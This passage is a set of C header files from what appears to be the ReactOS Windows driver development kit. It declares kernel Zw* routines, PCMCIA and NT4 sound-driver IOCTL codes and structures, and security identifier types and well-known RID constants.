BOOLEAN
NTAPI
SeSinglePrivilegeCheck(
  IN LUID PrivilegeValue,
  IN KPROCESSOR_MODE PreviousMode);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


/******************************************************************************
 *                            ZwXxx Functions                                 *
 ******************************************************************************/


NTSYSAPI
NTSTATUS
NTAPI
ZwAllocateLocallyUniqueId(
  OUT PLUID Luid);

NTSYSAPI
NTSTATUS
NTAPI
ZwTerminateProcess(
  IN HANDLE ProcessHandle OPTIONAL,
  IN NTSTATUS ExitStatus);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenProcess(
  OUT PHANDLE ProcessHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN PCLIENT_ID ClientId OPTIONAL);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSTATUS
NTAPI
ZwCancelTimer(
  IN HANDLE TimerHandle,
  OUT PBOOLEAN CurrentState OPTIONAL);

NTSTATUS
NTAPI
ZwCreateTimer(
  OUT PHANDLE TimerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN TIMER_TYPE TimerType);

NTSTATUS
NTAPI
ZwOpenTimer(
  OUT PHANDLE TimerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationThread(
  IN HANDLE ThreadHandle,
  IN THREADINFOCLASS ThreadInformationClass,
  IN PVOID ThreadInformation,
  IN ULONG ThreadInformationLength);

NTSTATUS
NTAPI
ZwSetTimer(
  IN HANDLE TimerHandle,
  IN PLARGE_INTEGER DueTime,
  IN PTIMER_APC_ROUTINE TimerApcRoutine OPTIONAL,
  IN PVOID TimerContext OPTIONAL,
  IN BOOLEAN ResumeTimer,
  IN LONG Period OPTIONAL,
  OUT PBOOLEAN PreviousState OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwDisplayString(
  IN PUNICODE_STRING String);

NTSYSAPI
NTSTATUS
NTAPI
ZwPowerInformation(
  IN POWER_INFORMATION_LEVEL PowerInformationLevel,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryVolumeInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FsInformation,
  IN ULONG Length,
  IN FS_INFORMATION_CLASS FsInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeviceIoControlFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG IoControlCode,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSTATUS
NTAPI
ZwSetTimerEx(
  IN HANDLE TimerHandle,
  IN TIMER_SET_INFORMATION_CLASS TimerSetInformationClass,
  IN OUT PVOID TimerSetInformation,
  IN ULONG TimerSetInformationLength);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */



/* UNSORTED */

#define VER_SET_CONDITION(ConditionMask, TypeBitMask, ComparisonType) \
  ((ConditionMask) = VerSetConditionMask((ConditionMask),             \
  (TypeBitMask), (ComparisonType)))

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTSYSAPI
ULONGLONG
NTAPI
VerSetConditionMask(
  IN ULONGLONG ConditionMask,
  IN ULONG TypeMask,
  IN UCHAR Condition);
#endif

typedef struct _KERNEL_USER_TIMES {
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER ExitTime;
  LARGE_INTEGER KernelTime;
  LARGE_INTEGER UserTime;
} KERNEL_USER_TIMES, *PKERNEL_USER_TIMES;

/* NtXxx Functions */

typedef enum _SYSTEM_FIRMWARE_TABLE_ACTION {
  SystemFirmwareTable_Enumerate,
  SystemFirmwareTable_Get
} SYSTEM_FIRMWARE_TABLE_ACTION;

typedef struct _SYSTEM_FIRMWARE_TABLE_INFORMATION {
  ULONG ProviderSignature;
  SYSTEM_FIRMWARE_TABLE_ACTION Action;
  ULONG TableID;
  ULONG TableBufferLength;
  UCHAR TableBuffer[ANYSIZE_ARRAY];
} SYSTEM_FIRMWARE_TABLE_INFORMATION, *PSYSTEM_FIRMWARE_TABLE_INFORMATION;

typedef NTSTATUS
(__cdecl *PFNFTH)(
  IN OUT PSYSTEM_FIRMWARE_TABLE_INFORMATION SystemFirmwareTableInfo);

typedef struct _SYSTEM_FIRMWARE_TABLE_HANDLER {
  ULONG ProviderSignature;
  BOOLEAN Register;
  PFNFTH FirmwareTableHandler;
  PVOID DriverObject;
} SYSTEM_FIRMWARE_TABLE_HANDLER, *PSYSTEM_FIRMWARE_TABLE_HANDLER;

typedef ULONG_PTR
(NTAPI *PDRIVER_VERIFIER_THUNK_ROUTINE)(
  IN PVOID Context);

typedef struct _DRIVER_VERIFIER_THUNK_PAIRS {
  PDRIVER_VERIFIER_THUNK_ROUTINE PristineRoutine;
  PDRIVER_VERIFIER_THUNK_ROUTINE NewRoutine;
} DRIVER_VERIFIER_THUNK_PAIRS, *PDRIVER_VERIFIER_THUNK_PAIRS;

#define DRIVER_VERIFIER_SPECIAL_POOLING             0x0001
#define DRIVER_VERIFIER_FORCE_IRQL_CHECKING         0x0002
#define DRIVER_VERIFIER_INJECT_ALLOCATION_FAILURES  0x0004
#define DRIVER_VERIFIER_TRACK_POOL_ALLOCATIONS      0x0008
#define DRIVER_VERIFIER_IO_CHECKING                 0x0010

#define SHARED_GLOBAL_FLAGS_ERROR_PORT_V        0x0
#define SHARED_GLOBAL_FLAGS_ERROR_PORT          (1UL << SHARED_GLOBAL_FLAGS_ERROR_PORT_V)

#define SHARED_GLOBAL_FLAGS_ELEVATION_ENABLED_V 0x1
#define SHARED_GLOBAL_FLAGS_ELEVATION_ENABLED   (1UL << SHARED_GLOBAL_FLAGS_ELEVATION_ENABLED_V)

#define SHARED_GLOBAL_FLAGS_VIRT_ENABLED_V      0x2
#define SHARED_GLOBAL_FLAGS_VIRT_ENABLED        (1UL << SHARED_GLOBAL_FLAGS_VIRT_ENABLED_V)

#define SHARED_GLOBAL_FLAGS_INSTALLER_DETECT_ENABLED_V  0x3
#define SHARED_GLOBAL_FLAGS_INSTALLER_DETECT_ENABLED    \
  (1UL << SHARED_GLOBAL_FLAGS_INSTALLER_DETECT_ENABLED_V)

#define SHARED_GLOBAL_FLAGS_SPARE_V                     0x4
#define SHARED_GLOBAL_FLAGS_SPARE                       \
  (1UL << SHARED_GLOBAL_FLAGS_SPARE_V)

#define SHARED_GLOBAL_FLAGS_DYNAMIC_PROC_ENABLED_V      0x5
#define SHARED_GLOBAL_FLAGS_DYNAMIC_PROC_ENABLED        \
  (1UL << SHARED_GLOBAL_FLAGS_DYNAMIC_PROC_ENABLED_V)

#define SHARED_GLOBAL_FLAGS_SEH_VALIDATION_ENABLED_V    0x6
#define SHARED_GLOBAL_FLAGS_SEH_VALIDATION_ENABLED        \
  (1UL << SHARED_GLOBAL_FLAGS_SEH_VALIDATION_ENABLED_V)

#define EX_INIT_BITS(Flags, Bit) \
  *((Flags)) |= (Bit)             // Safe to use before concurrently accessible

#define EX_TEST_SET_BIT(Flags, Bit) \
  InterlockedBitTestAndSet ((PLONG)(Flags), (Bit))

#define EX_TEST_CLEAR_BIT(Flags, Bit) \
  InterlockedBitTestAndReset ((PLONG)(Flags), (Bit))

#define PCCARD_MAP_ERROR               0x01
#define PCCARD_DEVICE_PCI              0x10

#define PCCARD_SCAN_DISABLED           0x01
#define PCCARD_MAP_ZERO                0x02
#define PCCARD_NO_TIMER                0x03
#define PCCARD_NO_PIC                  0x04
#define PCCARD_NO_LEGACY_BASE          0x05
#define PCCARD_DUP_LEGACY_BASE         0x06
#define PCCARD_NO_CONTROLLERS          0x07

#define MAXIMUM_EXPANSION_SIZE (KERNEL_LARGE_STACK_SIZE - (PAGE_SIZE / 2))

/* Filesystem runtime library routines */

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsTotalDeviceFailure(
  IN NTSTATUS Status);
#endif

#ifdef __cplusplus
}
#endif

```

`include/ddk/ntddpcm.h`:

```h
/*
 * ntddpcm.h
 *
 * PCMCIA IOCTL interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _NTDDPCMH_
#define _NTDDPCMH_

#ifdef __cplusplus
extern "C" {
#endif

#define IOCTL_PCMCIA_BASE                 FILE_DEVICE_CONTROLLER

#define DD_PCMCIA_DEVICE_NAME             "\\\\.\\Pcmcia"
#define DD_PCMCIA_DEVICE_NAME_U           L"\\\\.\\Pcmcia"

#define IOCTL_GET_TUPLE_DATA \
  CTL_CODE(IOCTL_PCMCIA_BASE, 3000, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_SOCKET_INFORMATION \
  CTL_CODE(IOCTL_PCMCIA_BASE, 3004, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DEVICE_IDENTIFIER_LENGTH          64
#define DRIVER_NAME_LENGTH                32
#define MANUFACTURER_NAME_LENGTH          64

#define PcmciaInvalidControllerType       0xffffffff

typedef struct _TUPLE_REQUEST {
 USHORT  Socket;
} TUPLE_REQUEST, *PTUPLE_REQUEST;

typedef enum _PCMCIA_CONTROLLER_CLASS {
	PcmciaInvalidControllerClass = -1,
	PcmciaIntelCompatible,
	PcmciaCardBusCompatible,
	PcmciaElcController,
	PcmciaDatabook,
	PcmciaPciPcmciaBridge,
	PcmciaCirrusLogic,
	PcmciaTI,
	PcmciaTopic,
	PcmciaRicoh,
	PcmciaDatabookCB,
	PcmciaOpti,
	PcmciaTrid,
	PcmciaO2Micro,
	PcmciaNEC,
	PcmciaNEC_98
} PCMCIA_CONTROLLER_CLASS, *PPCMCIA_CONTROLLER_CLASS;

typedef struct _PCMCIA_SOCKET_INFORMATION {
	USHORT  Socket;
	USHORT  TupleCrc;
	UCHAR  Manufacturer[MANUFACTURER_NAME_LENGTH];
	UCHAR  Identifier[DEVICE_IDENTIFIER_LENGTH];
	UCHAR  DriverName[DRIVER_NAME_LENGTH];
	UCHAR  DeviceFunctionId;
	UCHAR  Reserved;
	UCHAR  CardInSocket;
	UCHAR  CardEnabled;
	ULONG  ControllerType;
} PCMCIA_SOCKET_INFORMATION, *PPCMCIA_SOCKET_INFORMATION;

#define PcmciaClassFromControllerType(type)     ((PCMCIA_CONTROLLER_CLASS)((type) & 0xff))
#define PcmciaModelFromControllerType(type)     (((type) >> 8) & 0x3ffff)
#define PcmciaRevisionFromControllerType(type)  ((type) >> 26)


DEFINE_GUID(GUID_PCMCIA_INTERFACE_STANDARD, \
  0xbed5dadfL, 0x38fb, 0x11d1, 0x94, 0x62, 0x00, 0xc0, 0x4f, 0xb9, 0x60, 0xee);

typedef ULONG MEMORY_SPACE;

typedef ULONG
(NTAPI *PPCMCIA_READ_WRITE_CONFIG)(
  IN PVOID  Context,
  IN ULONG  WhichSpace,
  IN PUCHAR  Buffer,
  IN ULONG  Offset,
  IN ULONG  Length);

#define PCCARD_PCI_CONFIGURATION_SPACE    0
#define PCCARD_ATTRIBUTE_MEMORY           1
#define PCCARD_COMMON_MEMORY              2
#define PCCARD_ATTRIBUTE_MEMORY_INDIRECT  3
#define PCCARD_COMMON_MEMORY_INDIRECT     4

typedef struct _PCMCIA_BUS_INTERFACE_STANDARD {
	USHORT  Size;
	USHORT  Version;
	PVOID  Context;
	PINTERFACE_REFERENCE  InterfaceReference;
	PINTERFACE_DEREFERENCE  InterfaceDereference;
	PPCMCIA_READ_WRITE_CONFIG ReadConfig;
	PPCMCIA_READ_WRITE_CONFIG  WriteConfig;
} PCMCIA_BUS_INTERFACE_STANDARD, *PPCMCIA_BUS_INTERFACE_STANDARD;

#define PCMCIA_MEMORY_8BIT_ACCESS         0
#define PCMCIA_MEMORY_16BIT_ACCESS        1

typedef BOOLEAN
(NTAPI *PPCMCIA_MODIFY_MEMORY_WINDOW)(
  IN PVOID  Context,
  IN ULONGLONG  HostBase,
  IN ULONGLONG  CardBase,
  IN BOOLEAN  Enable,
  IN ULONG  WindowSize  OPTIONAL,
  IN UCHAR  AccessSpeed  OPTIONAL,
  IN UCHAR  BusWidth  OPTIONAL,
  IN BOOLEAN  IsAttributeMemory  OPTIONAL);

#define PCMCIA_VPP_0V                     0
#define PCMCIA_VPP_12V                    1
#define PCMCIA_VPP_IS_VCC                 2

typedef BOOLEAN
(NTAPI *PPCMCIA_SET_VPP)(
  IN PVOID  Context,
  IN UCHAR  VppLevel);

typedef BOOLEAN
(NTAPI *PPCMCIA_IS_WRITE_PROTECTED)(
  IN PVOID  Context);

typedef struct _PCMCIA_INTERFACE_STANDARD {
	USHORT  Size;
	USHORT  Version;
	PINTERFACE_REFERENCE  InterfaceReference;
	PINTERFACE_DEREFERENCE  InterfaceDereference;
	PVOID  Context;
	PPCMCIA_MODIFY_MEMORY_WINDOW  ModifyMemoryWindow;
	PPCMCIA_SET_VPP  SetVpp;
	PPCMCIA_IS_WRITE_PROTECTED  IsWriteProtected;
} PCMCIA_INTERFACE_STANDARD, *PPCMCIA_INTERFACE_STANDARD;

#ifdef __cplusplus
}
#endif

#endif /* _NTDDPCMH_ */

```

`include/ddk/ntddsnd.h`:

```h
/*
    ReactOS Sound System
    NT4 Multimedia Audio Support (ntddsnd.h)

    This file is in the public domain.

    Author:
        Andrew Greenwood (andrew.greenwood@silverblade.co.uk)

    History:
        24 May 2008 - Created
        2 July 2008 - Added device names as seen from user-mode
        5 July 2008 - Added macros for checking device type
        14 Feb 2009 - Added base control codes for nonstandard extensions

    This file contains definitions and structures for Windows NT4 style
    multimedia drivers. The NT4 DDK has these split across multiple header
    files: NTDDSND.H, NTDDWAVE.H, NTDDMIDI.H, NTDDMIX.H and NTDDAUX.H

    Should you have an unstoppable urge to build an NT4 multimedia driver
    against these headers, just create the other files listed above and make
    them #include this one.

    There are also a number of additional enhancements within this file
    not found in the originals (such as DOS device name strings and device
    type IDs).
*/

#ifndef NTDDSND_H
#define NTDDSND_H

#define SOUND_MAX_DEVICES           100
#define SOUND_MAX_DEVICE_NAME       80


/*
    Base control codes
*/

#define IOCTL_SOUND_BASE    FILE_DEVICE_SOUND
#define IOCTL_WAVE_BASE     0x0000
#define IOCTL_MIDI_BASE     0x0080
#define IOCTL_AUX_BASE      0x0100
#define IOCTL_MIX_BASE      0x0180


/*
    Helper macros for defining control codes
*/

#define WAVE_CTL_CODE(subcode, iomethod, access) \
    CTL_CODE(FILE_DEVICE_SOUND, IOCTL_WAVE_BASE + subcode, iomethod, access)

#define MIDI_CTL_CODE(subcode, iomethod, access) \
    CTL_CODE(FILE_DEVICE_SOUND, IOCTL_MIDI_BASE + subcode, iomethod, access)

#define MIX_CTL_CODE(subcode, iomethod, access) \
    CTL_CODE(FILE_DEVICE_SOUND, IOCTL_MIX_BASE + subcode, iomethod, access)

#define AUX_CTL_CODE(subcode, iomethod, access) \
    CTL_CODE(FILE_DEVICE_SOUND, IOCTL_AUX_BASE + subcode, iomethod, access)


/*
    Wave device control codes
*/

#define IOCTL_WAVE_QUERY_FORMAT \
    WAVE_CTL_CODE(0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_WAVE_SET_FORMAT \
    WAVE_CTL_CODE(0x0002, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_GET_CAPABILITIES \
    WAVE_CTL_CODE(0x0003, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_WAVE_SET_STATE \
    WAVE_CTL_CODE(0x0004, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_GET_STATE \
    WAVE_CTL_CODE(0x0005, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_GET_POSITION \
    WAVE_CTL_CODE(0x0006, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_SET_VOLUME \
    WAVE_CTL_CODE(0x0007, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_WAVE_GET_VOLUME \
    WAVE_CTL_CODE(0x0008, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_WAVE_SET_PITCH \
    WAVE_CTL_CODE(0x0009, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_GET_PITCH \
    WAVE_CTL_CODE(0x000A, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_SET_PLAYBACK_RATE \
    WAVE_CTL_CODE(0x000B, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_GET_PLAYBACK_RATE \
    WAVE_CTL_CODE(0x000C, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_PLAY \
    WAVE_CTL_CODE(0x000D, METHOD_IN_DIRECT, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_RECORD \
    WAVE_CTL_CODE(0x000E, METHOD_OUT_DIRECT, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_BREAK_LOOP \
    WAVE_CTL_CODE(0x000F, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_WAVE_SET_LOW_PRIORITY \
    WAVE_CTL_CODE(0x0010, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#if DBG
/* Debug-only control code */
#define IOCTL_WAVE_SET_DEBUG_LEVEL \
        WAVE_CTL_CODE(0x0040, METHOD_BUFFERED, FILE_READ_ACCESS)
#endif


/*
    MIDI device control codes
*/

#define IOCTL_MIDI_GET_CAPABILITIES \
    MIDI_CTL_CODE(0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIDI_SET_STATE \
    MIDI_CTL_CODE(0x0002, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_MIDI_GET_STATE \
    MIDI_CTL_CODE(0x0003, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_MIDI_SET_VOLUME \
    MIDI_CTL_CODE(0x0004, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIDI_GET_VOLUME \
    MIDI_CTL_CODE(0x0005, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIDI_PLAY \
    MIDI_CTL_CODE(0x0006, METHOD_NEITHER, FILE_WRITE_ACCESS)

#define IOCTL_MIDI_RECORD \
    MIDI_CTL_CODE(0x0007, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_MIDI_CACHE_PATCHES \
    MIDI_CTL_CODE(0x0008, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_MIDI_CACHE_DRUM_PATCHES \
    MIDI_CTL_CODE(0x0009, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#if DBG
/* Debug-only control code */
#define IOCTL_MIDI_SET_DEBUG_LEVEL \
        WAVE_CTL_CODE(0x0040, METHOD_BUFFERED, FILE_READ_ACCESS)
#endif


/*
    Mixer device control codes
*/

#define IOCTL_MIX_GET_CONFIGURATION \
    MIX_CTL_CODE(0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIX_GET_CONTROL_DATA \
    MIX_CTL_CODE(0x0002, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIX_GET_LINE_DATA \
    MIX_CTL_CODE(0x0003, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_MIX_REQUEST_NOTIFY \
    MIX_CTL_CODE(0x0004, METHOD_BUFFERED, FILE_READ_ACCESS)


/*
    Auxiliary device control codes
*/

#define IOCTL_AUX_GET_CAPABILITIES \
    AUX_CTL_CODE(0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_AUX_SET_VOLUME \
    AUX_CTL_CODE(0x0002, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_AUX_GET_VOLUME \
    AUX_CTL_CODE(0x0003, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_SOUND_GET_CHANGED_VOLUME \
    AUX_CTL_CODE(0x0004, METHOD_BUFFERED, FILE_READ_ACCESS)


/*
    Wave structures & states
*/

#define WAVE_DD_MAX_VOLUME      0xFFFFFFFF

typedef struct _WAVE_DD_VOLUME
{
    ULONG Left;
    ULONG Right;
} WAVE_DD_VOLUME, *PWAVE_DD_VOLUME;

typedef struct _WAVE_DD_PITCH
{
    ULONG Pitch;
} WAVE_DD_PITCH, *PWAVE_DD_PITCH;

typedef struct _WAVE_DD_PLAYBACK_RATE
{
    ULONG Rate;
} WAVE_DD_PLAYBACK_RATE, *PWAVE_DD_PLAYBACK_RATE;

/* IOCTL_WAVE_SET_STATE commands */
#define WAVE_DD_STOP        0x0001
#define WAVE_DD_PLAY        0x0002
#define WAVE_DD_RECORD      0x0003
#define WAVE_DD_RESET       0x0004

/* IOCTL_WAVE_GET_STATE responses */
#define WAVE_DD_IDLE        0x0000
#define WAVE_DD_STOPPED     0x0001
#define WAVE_DD_PLAYING     0x0002
#define WAVE_DD_RECORDING   0x0003


/*
    MIDI structures & states
*/

typedef struct _MIDI_DD_INPUT_DATA
{
    LARGE_INTEGER Time;
    UCHAR Data[sizeof(ULONG)];
} MIDI_DD_INPUT_DATA, *PMIDI_DD_INPUT_DATA;

typedef struct _MIDI_DD_VOLUME
{
    ULONG Left;
    ULONG Right;
} MIDI_DD_VOLUME, *PMIDI_DD_VOLUME;

typedef struct _MIDI_DD_CACHE_PATCHES
{
    ULONG Bank;
    ULONG Flags;
    ULONG Patches[128];
} MIDI_DD_CACHE_PATCHES, *PMIDI_DD_CACHE_PATCHES;

typedef struct _MIDI_DD_CACHE_DRUM_PATCHES
{
    ULONG Patch;
    ULONG Flags;
    ULONG DrumPatches[128];
} MIDI_DD_CACHE_DRUM_PATCHES, *PMIDI_DD_CACHE_DRUM_PATCHES;

/* IOCTL_MIDI_SET_STATE commands */
#define MIDI_DD_STOP        0x0001
#define MIDI_DD_PLAY        0x0002
#define MIDI_DD_RECORD      0x0003
#define MIDI_DD_RESET       0x0004

/* IOCTL_MIDI_GET_STATE responses */
#define MIDI_DD_IDLE        0x0000
#define MIDI_DD_STOPPED     0x0001
#define MIDI_DD_PLAYING     0x0002
#define MIDI_DD_RECORDING   0x0003


/*
    Mixer structures
    TODO: This is incomplete (see NTDDMIX.H in NT4 DDK)
*/

typedef struct _MIXER_DD_READ_DATA
{
    ULONG Id;
} MIXER_DD_READ_DATA, *PMIXER_DD_READ_DATA;

typedef struct _MIXER_DD_LINE_DATA
{
    ULONG fdwLine;
} MIXER_DD_LINE_DATA, *PMIXER_DD_LINE_DATA;


/*
    Auxiliary structures
*/

#define AUX_DD_MAX_VOLUME   0xFFFFFFFF

typedef struct _AUX_DD_VOLUME
{
    ULONG Left;
    ULONG Right;
} AUX_DD_VOLUME, *PAUX_DD_VOLUME;


#endif /* NTDDSND_H */


```

`include/ddk/ntifs.h`:

```h
/*
 * ntifs.h
 *
 * Windows NT Filesystem Driver Developer Kit
 *
 * This file is part of the ReactOS DDK package.
 *
 * Contributors:
 *   Amine Khaldi
 *   Timo Kreuzer (timo.kreuzer@reactos.org)
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define _NTIFS_INCLUDED_
#define _GNU_NTIFS_

#ifdef __cplusplus
extern "C" {
#endif

/* Dependencies */
#include <ntddk.h>
#include <excpt.h>
#include <ntdef.h>
#include <ntnls.h>
#include <ntstatus.h>
#include <bugcodes.h>
#include <ntiologc.h>


#ifndef FlagOn
#define FlagOn(_F,_SF)        ((_F) & (_SF))
#endif

#ifndef BooleanFlagOn
#define BooleanFlagOn(F,SF)   ((BOOLEAN)(((F) & (SF)) != 0))
#endif

#ifndef SetFlag
#define SetFlag(_F,_SF)       ((_F) |= (_SF))
#endif

#ifndef ClearFlag
#define ClearFlag(_F,_SF)     ((_F) &= ~(_SF))
#endif

typedef UNICODE_STRING LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
typedef STRING LSA_STRING, *PLSA_STRING;
typedef OBJECT_ATTRIBUTES LSA_OBJECT_ATTRIBUTES, *PLSA_OBJECT_ATTRIBUTES;

/******************************************************************************
 *                            Security Manager Types                          *
 ******************************************************************************/
#ifndef SID_IDENTIFIER_AUTHORITY_DEFINED
#define SID_IDENTIFIER_AUTHORITY_DEFINED
typedef struct _SID_IDENTIFIER_AUTHORITY {
  UCHAR Value[6];
} SID_IDENTIFIER_AUTHORITY,*PSID_IDENTIFIER_AUTHORITY,*LPSID_IDENTIFIER_AUTHORITY;
#endif

#ifndef SID_DEFINED
#define SID_DEFINED
typedef struct _SID {
  UCHAR Revision;
  UCHAR SubAuthorityCount;
  SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
  ULONG SubAuthority[ANYSIZE_ARRAY];
} SID, *PISID;
#endif

#define SID_REVISION                    1
#define SID_MAX_SUB_AUTHORITIES         15
#define SID_RECOMMENDED_SUB_AUTHORITIES 1

typedef enum _SID_NAME_USE {
  SidTypeUser = 1,
  SidTypeGroup,
  SidTypeDomain,
  SidTypeAlias,
  SidTypeWellKnownGroup,
  SidTypeDeletedAccount,
  SidTypeInvalid,
  SidTypeUnknown,
  SidTypeComputer,
  SidTypeLabel,
  SidTypeLogonSession
} SID_NAME_USE, *PSID_NAME_USE;

typedef struct _SID_AND_ATTRIBUTES {
  PSID Sid;
  ULONG Attributes;
} SID_AND_ATTRIBUTES, *PSID_AND_ATTRIBUTES;
typedef SID_AND_ATTRIBUTES SID_AND_ATTRIBUTES_ARRAY[ANYSIZE_ARRAY];
typedef SID_AND_ATTRIBUTES_ARRAY *PSID_AND_ATTRIBUTES_ARRAY;

#define SID_HASH_SIZE 32
typedef ULONG_PTR SID_HASH_ENTRY, *PSID_HASH_ENTRY;

typedef struct _SID_AND_ATTRIBUTES_HASH {
  ULONG SidCount;
  PSID_AND_ATTRIBUTES SidAttr;
  SID_HASH_ENTRY Hash[SID_HASH_SIZE];
} SID_AND_ATTRIBUTES_HASH, *PSID_AND_ATTRIBUTES_HASH;

/* Universal well-known SIDs */

#define SECURITY_NULL_SID_AUTHORITY         {0,0,0,0,0,0}
#define SECURITY_WORLD_SID_AUTHORITY        {0,0,0,0,0,1}
#define SECURITY_LOCAL_SID_AUTHORITY        {0,0,0,0,0,2}
#define SECURITY_CREATOR_SID_AUTHORITY      {0,0,0,0,0,3}
#define SECURITY_NON_UNIQUE_AUTHORITY       {0,0,0,0,0,4}
#define SECURITY_RESOURCE_MANAGER_AUTHORITY {0,0,0,0,0,9}

#define SECURITY_NULL_RID                 (0x00000000L)
#define SECURITY_WORLD_RID                (0x00000000L)
#define SECURITY_LOCAL_RID                (0x00000000L)
#define SECURITY_LOCAL_LOGON_RID          (0x00000001L)

#define SECURITY_CREATOR_OWNER_RID        (0x00000000L)
#define SECURITY_CREATOR_GROUP_RID        (0x00000001L)
#define SECURITY_CREATOR_OWNER_SERVER_RID (0x00000002L)
#define SECURITY_CREATOR_GROUP_SERVER_RID (0x00000003L)
#define SECURITY_CREATOR_OWNER_RIGHTS_RID (0x00000004L)

/* NT well-known SIDs */

#define SECURITY_NT_AUTHORITY           {0,0,0,0,0,5}

#define SECURITY_DIALUP_RID             (0x00000001L)
#define SECURITY_NETWORK_RID            (0x00000002L)
#define SECURITY_BATCH_RID              (0x00000003L)
#define SECURITY_INTERACTIVE_RID        (0x00000004L)
#define SECURITY_LOGON_IDS_RID          (0x00000005L)
#define SECURITY_LOGON_IDS_RID_COUNT    (3L)
#define SECURITY_SERVICE_RID            (0x00000006L)
#define SECURITY_ANONYMOUS_LOGON_RID    (0x00000007L)
#define SECURITY_PROXY_RID              (0x00000008L)
#define SECURITY_ENTERPRISE_CONTROLLERS_RID (0x00000009L)
#define SECURITY_SERVER_LOGON_RID       SECURITY_ENTERPRISE_CONTROLLERS_RID
#define SECURITY_PRINCIPAL_SELF_RID     (0x0000000AL)
#define SECURITY_AUTHENTICATED_USER_RID (0x0000000BL)
#define SECURITY_RESTRICTED_CODE_RID    (0x0000000CL)
#define SECURITY_TERMINAL_SERVER_RID    (0x0000000DL)
#define SECURITY_REMOTE_LOGON_RID       (0x0000000EL)
#define SECURITY_THIS_ORGANIZATION_RID  (0x0000000FL)
#define SECURITY_IUSER_RID              (0x00000011L)
#define SECURITY_LOCAL_SYSTEM_RID       (0x00000012L)
#define SECURITY_LOCAL_SERVICE_RID      (0x00000013L)
